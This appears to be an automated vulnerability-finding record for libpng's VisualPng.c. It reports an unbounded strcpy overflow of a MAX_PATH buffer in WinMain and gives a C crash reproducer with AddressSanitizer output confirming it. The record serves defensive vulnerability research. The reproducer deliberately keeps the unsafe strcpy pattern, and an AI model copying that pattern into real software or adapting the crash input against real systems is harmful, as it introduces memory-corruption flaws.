@@ -1,0 +1,51 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "contrib/visupng/VisualPng.c",
+    "line": 111,
+    "function": "WinMain",
+    "bug_type": "out-of-bounds-write",
+    "cwe": "CWE-787",
+    "confidence": "high",
+    "explanation": "Copies an unbounded command line string into fixed-size szCmdFileName using strcpy, allowing a command line longer than MAX_PATH-1 to overflow the buffer.",
+    "abs_path": "/tmp/libpng_upstream/contrib/visupng/VisualPng.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n/* Mimic Windows MAX_PATH */\n#ifndef MAX_PATH\n#define MAX_PATH 260\n#endif\n\n/* Global variables as in the original file */\nstatic char *szProgName = \"visupng\";\nstatic char *szAppName  = \"Visual PNG\";\nstatic char *szIconName = \"visupng\";\nstatic char szCmdFileName[MAX_PATH];\n\n/* Minimal typedefs to avoid pulling in Windows headers */\ntypedef void* HINSTANCE;\ntypedef char* PSTR;\n\n/* Reimplementation of the vulnerable logic from WinMain() focusing on lines 106-114 */\nint WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)\n{\n    (void)hInstance; (void)hPrevInstance; (void)iCmdShow; /* unused in this reproducer */\n\n    /* Vulnerable command line handling (copied from the source context) */\n    if ((szCmdLine != NULL) && (*szCmdLine != '\\0'))\n        if (szCmdLine[0] == '\"')\n            strncpy(szCmdFileName, szCmdLine + 1, strlen(szCmdLine) - 2);\n        else\n            strcpy(szCmdFileName, szCmdLine); /* out-of-bounds write when szCmdLine is longer than MAX_PATH-1 */\n    else\n        strcpy(szCmdFileName, \"\");\n\n    return 0;\n}\n\nint main(void)\n{\n    /* Craft a command line much longer than MAX_PATH to trigger the overflow in strcpy */\n    const size_t biglen = 5000; /* >> MAX_PATH */\n    char *cmd = (char*)malloc(biglen + 1);\n    if (!cmd) {\n        perror(\"malloc\");\n        return 1;\n    }\n\n    /* Ensure we take the strcpy branch (first char is not a quote) */\n    memset(cmd, 'A', biglen);\n    cmd[biglen] = '\\0';\n\n    /* Call the vulnerable routine */\n    WinMain(NULL, NULL, cmd, 0);\n\n    /* Touch szCmdFileName to keep it referenced (the overflow should already have been detected by ASan) */\n    printf(\"First char copied: %c\\n\", szCmdFileName[0]);\n\n    free(cmd);\n    return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.9617581367492676,
+      "output": "=================================================================\n==3728092==ERROR: AddressSanitizer: global-buffer-overflow on address 0x586692c506a4 at pc 0x58669227641b bp 0x7ffe72d02190 sp 0x7ffe72d01958\nWRITE of size 5001 at 0x586692c506a4 thread T0\n    #0 0x58669227641a in strcpy (/app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer+0x8f41a) (BuildId: bd76842c9b7285a363e8612c8c1cb987a552f6fb)\n    #1 0x5866922c7da4 in WinMain /app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer.c:30:13\n    #2 0x5866922c7e89 in main /app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer.c:52:5\n    #3 0x7be4a202a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #4 0x7be4a202a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #5 0x586692208314 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer+0x21314) (BuildId: bd76842c9b7285a363e8612c8c1cb987a552f6fb)\n\n0x586692c506a4 is located 0 bytes to the right of global variable 'szCmdFileName' defined in '/app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer.c:14:13' (0x586692c505a0) of size 260\nSUMMARY: AddressSanitizer: global-buffer-overflow (/app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer+0x8f41a) (BuildId: bd76842c9b7285a363e8612c8c1cb987a552f6fb) in strcpy\nShadow bytes around the buggy address:\n  0x0b0d52582080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d52582090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d525820a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d525820b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d525820c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0b0d525820d0: 00 00 00 00[04]f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9\n  0x0b0d525820e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d525820f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d52582100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d52582110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0b0d52582120: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==3728092==ABORTING\n",
+      "error_type": "global-buffer-overflow",
+      "frames": [
+        [
+          "1",
+          "WinMain",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer.c:30",
+          "13"
+        ],
+        [
+          "2",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/VisualPng_111_out-of-bounds-write/reproducer.c:52",
+          "5"
+        ],
+        [
+          "3",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "4",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
